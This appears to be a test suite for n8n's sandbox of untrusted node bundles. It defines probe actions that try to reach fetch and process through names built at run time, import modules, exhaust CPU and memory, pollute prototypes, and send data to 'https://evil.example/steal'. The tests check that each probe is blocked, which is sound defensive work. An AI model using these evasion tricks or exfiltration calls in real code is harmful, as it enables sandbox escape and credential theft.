import { existsSync } from 'node:fs';
import { mkdtemp, rm, writeFile } from 'node:fs/promises';
import { createServer, type Server } from 'node:http';
import type { AddressInfo } from 'node:net';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { Readable } from 'node:stream';
import type { IHttpRequestOptions, INode } from 'n8n-workflow';

import { compat, defineCredential, field } from '../credentials';
import { freezeAction, GUEST_LACKS } from '../freeze';
import { defineNode, t } from '../index';
import { sandboxedVersionOf, type SandboxOptions } from '../sandbox';
import { executorOf, type BinaryStore, type ExecutorHost } from '../runtime';

const SANDBOX = path.resolve(__dirname, '..', '..', 'sandbox');
const SIDECAR = path.join(SANDBOX, 'sidecar', 'target', 'release', 'n8n-sandbox');
const GUESTS = path.join(SANDBOX, 'dist');
const GUEST = path.join(GUESTS, 'action.wasm');

const acmeToken = () =>
	defineCredential({
		id: 'acme.token',
		legacyName: 'acmeApi',
		displayName: 'Acme API',
		fields: { account: field.text('Account ID'), apiKey: field.secret('API Key') },
		baseUrl: 'https://api.acme.test',
		auth: (a) => a.bearer('apiKey'),
	});

const node: INode = {
	id: '1',
	name: 'Probe',
	type: 'probe',
	typeVersion: 1,
	position: [0, 0],
	parameters: {},
};

const PROBES = (port: number) => `import { defineNode, t } from '@n8n/node-sdk';
import { compat, credential, defineCredential, field } from '@n8n/node-sdk/credentials';
const { binary, obj, str } = t;
const probe = defineNode({ id: 'probe', displayName: 'Probe' });
const acmeToken = defineCredential({
	id: 'acme.token',
	legacyName: 'acmeApi',
	displayName: 'Acme API',
	fields: { account: field.text('Account ID'), apiKey: field.secret('API Key') },
	baseUrl: 'https://api.acme.test',
	auth: (a) => a.bearer('apiKey'),
});
const acme = defineNode({ id: 'acme', displayName: 'Acme', credential: credential({ types: [acmeToken] }) });
const slackApi = compat('slackApi', { hosts: ['evil.example'] });
const thief = defineNode({
	id: 'thief',
	displayName: 'Thief',
	credential: credential({ types: [slackApi] }),
});
const baseThief = defineNode({
	id: 'baseThief',
	displayName: 'Base Thief',
	baseUrl: 'https://evil.example',
	credential: credential({ types: [slackApi] }),
});
const spec = (run: (context: any) => Promise<unknown>, extra: Record<string, unknown> = {}, node: any = probe) =>
	node.action('probe', {
		action: 'Probe',
		summary: 'Probe the sandbox.',
		flow: { effect: 'read', cardinality: 'per-item' },
		input: {},
		output: obj({ value: str() }),
		...extra,
		run,
	} as any);
const canary = 'http://127.0.0.1:${port}/';
// Names built at run time pass the freeze check, so the sandbox must stop them.
export const fetchProbe = spec(async () => ({ value: String(await (globalThis as any)[['fet', 'ch'].join('')](canary)) }));
export const processProbe = spec(async () => ({ value: String((globalThis as any)[['pro', 'cess'].join('')].env.SANDBOX_CANARY) }));
export const importProbe = spec(async () => ({ value: String(await import(['node', 'fs'].join(':'))) }));
export const globalsProbe = spec(async () => ({
	value: JSON.stringify(${JSON.stringify(GUEST_LACKS)}.filter((name) => name in globalThis)),
}));
export const timerProbe = spec(async ({ http }) => {
	(globalThis as any)[['set', 'Timeout'].join('')](() => void http.request({ url: canary }), 0);
	return { value: 'scheduled' };
});
export const loopProbe = spec(async () => {
	for (;;) {}
});
export const memoryProbe = spec(async () => {
	const kept: unknown[] = [];
	for (;;) kept.push(new Array(1_000_000).fill(kept.length));
});
export const undeclaredProbe = spec(async (context) => ({
	value: String(await context.dataTables.open({ name: 'secrets' })),
}));
export const egressProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['api.example.com'] } },
);
export const noEgressProbe = spec(async ({ http }) => ({
	value: String(await http.request({ url: 'https://api.example.com/steal' })),
}));
export const credentialHostProbe = spec(
	async ({ http }) => ({ value: String(await http.request({ url: 'https://evil.example/steal' })) }),
	{ egress: { hosts: ['evil.example'] } },
	thief,
);
export const baseUrlProbe = spec(async ({ http }) => ({ value: String(await http.request({ path: '/steal' })) }), {}, baseThief);
export const pollutionProbe = spec(async () => {
	(Object.prototype as any).polluted = 'yes';
	return { value: String(({} as any).polluted) };
});
export const randomProbe = spec(async () => ({
	value: [Math.random(), crypto.getRandomValues(new Uint32Array(2)).join('-'), crypto.randomUUID()].join(' '),
}));
export const echoProbe = spec(async ({ http }) => ({
	value: JSON.stringify(await http.request({ url: 'https://api.example.com/echo', fullResponse: true })),
}), { egress: { hosts: ['api.example.com'] } });
export const failureProbe = spec(async ({ http }) => {
	try {
		return { value: String(await http.request({ url: 'https://api.example.com/missing' })) };
	} catch (error) {
		return { value: JSON.stringify(error.headers) };
	}
}, { egress: { hosts: ['api.example.com'] } });
export const credentialProbe = spec(async ({ credential }) => ({ value: JSON.stringify(credential) }), {}, acme);
export const credentialErrorProbe = spec(async (context) => {
	try {
		return { value: JSON.stringify(context.credential) };
	} catch (error) {
		return { value: String(error.message) };
	}
}, {}, acme);
export const binaryProbe = spec(
	async ({ input, http, binary: files }) => {
		const chunks: Uint8Array[] = [];
		for await (const chunk of input.file.read()) chunks.push(chunk);
		const copy = await files.create({ mimeType: 'application/octet-stream', fileName: 'copy.bin' }, chunks);
		const sent = await http.request({ method: 'POST', url: 'https://api.example.com/upload', body: copy });
		const fetched = await http.request({ url: 'https://api.example.com/file', response: 'binary' });
		const size = chunks.reduce((sum, chunk) => sum + chunk.length, 0);
		const value = JSON.stringify({ size, chunks: chunks.length, meta: input.file.meta, sent, fetched: fetched.meta });
		return { value, copy, fetched };
	},
	{
		input: { file: binary() },
		output: obj({ value: str(), copy: binary(), fetched: binary() }),
		egress: { hosts: ['api.example.com'] },
	},
);
export const openStreamsProbe = spec(
	async ({ input, binary: files }) => {
		for await (const _chunk of input.file.read()) break;
		const failing = async function* () {
			yield 'part';
			throw new Error('chunks failed');
		};
		await files.create({ mimeType: 'text/plain' }, failing()).catch(() => undefined);
		return { value: 'done' };
	},
	{ input: { file: binary() } },
);
`;

const PROBE_NAMES = [
	'fetchProbe',
	'processProbe',
	'importProbe',
	'timerProbe',
	'loopProbe',
	'memoryProbe',
	'undeclaredProbe',
	'egressProbe',
	'noEgressProbe',
	'credentialHostProbe',
	'baseUrlProbe',
	'pollutionProbe',
	'randomProbe',
	'echoProbe',
	'failureProbe',
	'credentialProbe',
	'credentialErrorProbe',
	'binaryProbe',
	'openStreamsProbe',
	'globalsProbe',
] as const;

type ProbeName = (typeof PROBE_NAMES)[number];

const RESPONSE_HEADERS = {
	'Content-Type': 'application/json',
	'Set-Cookie': ['session=secret; HttpOnly', 'csrf=secret'],
	'WWW-Authenticate': 'Bearer realm="acme"',
	Link: '<https://api.example.com/echo?page=2>; rel="next"',
	'X-RateLimit-Remaining': 9,
	'X-Secret': 'internal',
};

describe.skipIf(!existsSync(SIDECAR) || !existsSync(GUEST))('the sandbox', () => {
	const dirs = { root: '' };
	const canary = { hits: 0, server: undefined as Server | undefined };
	const requests: IHttpRequestOptions[] = [];
	const options = (): SandboxOptions => ({
		sidecar: SIDECAR,
		guests: GUESTS,
		cacheDir: path.join(dirs.root, 'cache'),
		credentialType: (name) =>
			name === 'slackApi'
				? compat('slackApi', { hosts: ['slack.com'], baseUrl: 'https://slack.com/api' })
				: name === 'acmeApi'
					? acmeToken()
					: undefined,
		limits: { cpuMs: 1_000, memoryMb: 64, wallMs: 20_000 },
	});

	const hostOf = (): ExecutorHost => ({
		items: [{ json: {} }],
		node: { ...node, credentials: { slackApi: { id: '1', name: 'Slack' } } },
		parameter: () => undefined,
		request: async (request) => {
			requests.push(request);
			return { body: { z: 1, a: 2 }, headers: RESPONSE_HEADERS, statusCode: 200 };
		},
		continueOnFail: () => false,
	});

	const outputOf = async (name: ProbeName, host = hostOf()) => {
		const frozen = await freezeAction(path.join(dirs.root, 'probes.ts'), name);
		const { executor } = await sandboxedVersionOf(
			{ manifest: frozen.manifest, readBundle: async () => frozen.bundle },
			options(),
		);
		const [[output] = []] = await executor(host);
		return output;
	};
	const run = async (name: ProbeName, host = hostOf()) => (await outputOf(name, host))?.json.value;

	beforeAll(async () => {
		dirs.root = await mkdtemp(path.join(tmpdir(), 'node-sdk-sandbox-'));
		canary.server = createServer((_request, response) => {
			canary.hits += 1;
			response.end('reached');
		});
		await new Promise<void>((resolve) => canary.server?.listen(0, '127.0.0.1', resolve));
		const { port } = canary.server.address() as AddressInfo;
		await writeFile(path.join(dirs.root, 'probes.ts'), PROBES(port));
		process.env.SANDBOX_CANARY = 'secret';
	});

	afterAll(async () => {
		delete process.env.SANDBOX_CANARY;
		await new Promise((resolve) => canary.server?.close(resolve));
		await rm(dirs.root, { recursive: true, force: true });
	});

	beforeEach(() => {
		requests.length = 0;
		canary.hits = 0;
	});

	it('gives the bundle no global fetch', async () => {
		await expect(run('fetchProbe')).rejects.toThrow('fetch is not available in the sandbox');
		expect(canary.hits).toBe(0);
	});

	it('gives the bundle no process and no environment', async () => {
		await expect(run('processProbe')).rejects.toThrow(
			/can't access property "env", .* is undefined/,
		);
	});

	it('has none of the globals that the freeze check refuses', async () => {
		await expect(run('globalsProbe')).resolves.toBe('[]');
	});

	it('stops a bundle that imports a module', async () => {
		await expect(run('importProbe')).rejects.toThrow('The bundle stopped the JS engine');
	});

	it('gives the bundle no timers, so nothing runs after the run', async () => {
		await expect(run('timerProbe')).rejects.toThrow('setTimeout is not available in the sandbox');
		expect(requests).toEqual([]);
		expect(canary.hits).toBe(0);
	});

	it('stops an endless loop at the CPU limit', async () => {
		const started = Date.now();
		await expect(run('loopProbe')).rejects.toThrow(
			'The bundle used its CPU time of 1000 ms and was stopped',
		);
		expect(Date.now() - started).toBeLessThan(10_000);
	});

	it('stops a memory blow-up at the memory limit', async () => {
		await expect(run('memoryProbe')).rejects.toThrow(
			'The bundle reached its memory limit of 64 MB and was stopped',
		);
	});

	it('refuses an import that the manifest does not grant, before the host sees it', async () => {
		await expect(run('undeclaredProbe')).rejects.toThrow(
			'The bundle called data-tables.open, which its manifest does not grant',
		);
	});

	it('refuses a request outside the egress hosts in the host', async () => {
		await expect(run('egressProbe')).rejects.toThrow('evil.example');
		expect(requests).toEqual([]);
	});

	it('refuses every request of an action without egress and without a base URL', async () => {
		await expect(run('noEgressProbe')).rejects.toThrow(
			'Host not allowed: probe.probe may send requests to no host, not to api.example.com',
		);
		expect(requests).toEqual([]);
	});

	it('takes the credential hosts from the host, not from the bundle', async () => {
		await expect(run('credentialHostProbe')).rejects.toThrow('evil.example');
		expect(requests).toEqual([]);
	});

	it('refuses a bundle that names a base URL outside the egress hosts of its manifest', async () => {
		const { manifest, bundle } = await freezeAction(
			path.join(dirs.root, 'probes.ts'),
			'baseUrlProbe',
		);
		expect(manifest.contract.egress).toEqual({ hosts: ['evil.example'] });
		const { egress: _, ...contract } = manifest.contract;
		await expect(
			sandboxedVersionOf(
				{ manifest: { ...manifest, contract }, readBundle: async () => bundle },
				options(),
			),
		).rejects.toThrow(
			'names the base URL https://evil.example. Its host is not an egress host of its manifest',
		);
		expect(requests).toEqual([]);
	});

	it('keeps a change of the guest realm out of the host', async () => {
		await expect(run('pollutionProbe')).resolves.toBe('yes');
		expect(({} as Record<string, unknown>).polluted).toBeUndefined();
	});

	it('gives each run its own random values', async () => {
		const [first, second] = [await run('randomProbe'), await run('randomProbe')];
		expect(first).not.toBe(second);
	});

	it('sends a request through the host and gives the full response in its key order', async () => {
		await expect(run('echoProbe')).resolves.toBe(
			JSON.stringify({
				body: { z: 1, a: 2 },
				headers: {
					'content-type': 'application/json',
					link: '<https://api.example.com/echo?page=2>; rel="next"',
					'x-ratelimit-remaining': '9',
				},
				statusCode: 200,
			}),
		);
		expect(requests).toEqual([
			expect.objectContaining({ method: 'GET', url: 'https://api.example.com/echo' }),
		]);
	});

	it('gives the bundle only the allowed response headers, while the same action in-process gets all', async () => {
		const echo = defineNode({ id: 'probe', displayName: 'Probe' }).action('probe', {
			action: 'Probe',
			summary: 'Probe the sandbox.',
			flow: { effect: 'read', cardinality: 'per-item' },
			egress: { hosts: ['api.example.com'] },
			input: {},
			output: t.obj({ value: t.str() }),
			run: async ({ http }) => ({
				value: JSON.stringify(
					await http.request({ url: 'https://api.example.com/echo', fullResponse: true }),
				),
			}),
		});
		const [[inProcess] = []] = await executorOf(echo)(hostOf());
		const headersOf = (value: unknown) =>
			Object.keys(JSON.parse(String(value)).headers).map((name) => name.toLowerCase());

		expect(headersOf(inProcess?.json.value)).toEqual(
			expect.arrayContaining(['content-type', 'set-cookie', 'www-authenticate', 'x-secret']),
		);
		const sandboxed = headersOf(await run('echoProbe'));
		expect(sandboxed).toContain('content-type');
		expect(sandboxed).not.toContain('set-cookie');
		expect(sandboxed).not.toContain('www-authenticate');
		expect(sandboxed).not.toContain('x-secret');
	});

	it('gives the bundle only the allowed response headers of an HTTP failure', async () => {
		const value = await run('failureProbe', {
			...hostOf(),
			request: async () => {
				throw Object.assign(new Error('Not found'), {
					response: {
						status: 404,
						headers: { ...RESPONSE_HEADERS, 'Retry-After': '30' },
						data: {},
					},
				});
			},
		});

		expect(JSON.parse(value as string)).toEqual({
			'content-type': 'application/json',
			link: '<https://api.example.com/echo?page=2>; rel="next"',
			'x-ratelimit-remaining': '9',
			'retry-after': '30',
		});
	});

	it('gives run() the plain fields of the credential, and no secret', async () => {
		const value = await run('credentialProbe', {
			...hostOf(),
			node: { ...node, credentials: { acmeApi: { id: '1', name: 'Acme' } } },
			credentialData: async () => ({ account: 'acc-1', apiKey: 'key-secret-1' }),
		});
		expect(value).toBe(JSON.stringify({ type: 'acmeApi', fields: { account: 'acc-1' } }));
	});

	it('gives run() no stored value when the stored credential data does not match its fields', async () => {
		const value = await run('credentialErrorProbe', {
			...hostOf(),
			node: { ...node, credentials: { acmeApi: { id: '1', name: 'Acme' } } },
			credentialData: async () => ({
				account: { hidden: 'stored-value-1' },
				apiKey: 'key-secret-1',
			}),
		});
		expect(value).toBe('The stored data of the credential does not match its declared fields');
	});

	it('streams binary data in chunks through the host, in both directions', async () => {
		const input = Buffer.alloc(3 * 1024 * 1024 + 7, 'abc');
		const fetched = Buffer.from('fetched bytes');
		const uploaded: Buffer[] = [];
		const bufferOf = async (stream: AsyncIterable<Buffer>) => {
			const chunks: Buffer[] = [];
			for await (const chunk of stream) chunks.push(chunk);
			return Buffer.concat(chunks);
		};
		const store: BinaryStore = {
			input: async () => ({
				data: input.toString('base64'),
				mimeType: 'text/plain',
				fileName: 'in.txt',
				bytes: input.length,
			}),
			read: async (entry) => Readable.from([Buffer.from(entry.data, 'base64')]),
			write: async (stream, { mimeType, fileName }) => {
				const bytes = await bufferOf(stream);
				return {
					data: bytes.toString('base64'),
					mimeType: mimeType ?? 'application/octet-stream',
					...(fileName ? { fileName } : {}),
				};
			},
		};
		const output = await outputOf('binaryProbe', {
			...hostOf(),
			parameter: (name) => (name === 'file' ? 'data' : undefined),
			binary: store,
			request: async (request) => {
				requests.push(request);
				if (request.body instanceof Readable) uploaded.push(await bufferOf(request.body));
				return request.encoding === 'stream'
					? {
							body: Readable.from([fetched]),
							headers: { 'content-type': 'image/png' },
							statusCode: 200,
						}
					: { body: { ok: true }, headers: {}, statusCode: 200 };
			},
		});
		expect(JSON.parse(output?.json.value as string)).toEqual({
			size: input.length,
			chunks: 4,
			meta: { mimeType: 'text/plain', fileName: 'in.txt', bytes: input.length },
			sent: { ok: true },
			fetched: { mimeType: 'image/png', fileName: 'file' },
		});
		// `equals`, not `toEqual`: a deep compare of 3 MB takes seconds.
		expect(uploaded.map((bytes) => bytes.equals(input))).toEqual([true]);
		expect(Buffer.from(output?.binary?.copy?.data ?? '', 'base64').equals(input)).toBe(true);
		expect(Buffer.from(output?.binary?.fetched?.data ?? '', 'base64')).toEqual(fetched);
		expect(output?.binary?.copy).toMatchObject({
			mimeType: 'application/octet-stream',
			fileName: 'copy.bin',
		});
	});

	it('closes the binary readers and writers that a run leaves open', async () => {
		const reads: Readable[] = [];
		const writes: Array<Promise<unknown>> = [];
		const store: BinaryStore = {
			input: async () => ({
				data: Buffer.alloc(3 * 1024 * 1024).toString('base64'),
				mimeType: 'text/plain',
			}),
			read: async (entry) => {
				const stream = Readable.from([Buffer.from(entry.data, 'base64'), Buffer.from('end')]);
				reads.push(stream);
				return stream;
			},
			write: async (stream) => {
				const write = (async () => {
					for await (const _chunk of stream);
					return { data: '', mimeType: 'text/plain' };
				})();
				writes.push(write);
				return await write;
			},
		};
		const value = await run('openStreamsProbe', {
			...hostOf(),
			parameter: (name) => (name === 'file' ? 'data' : undefined),
			binary: store,
		});
		const settled = await Promise.race([
			Promise.allSettled(writes).then((results) => results.map(({ status }) => status)),
			new Promise((resolve) => setTimeout(() => resolve('pending'), 1_000)),
		]);
		expect(value).toBe('done');
		expect(reads.map((stream) => stream.destroyed)).toEqual([true]);
		expect(settled).toEqual(['rejected']);
	});
});
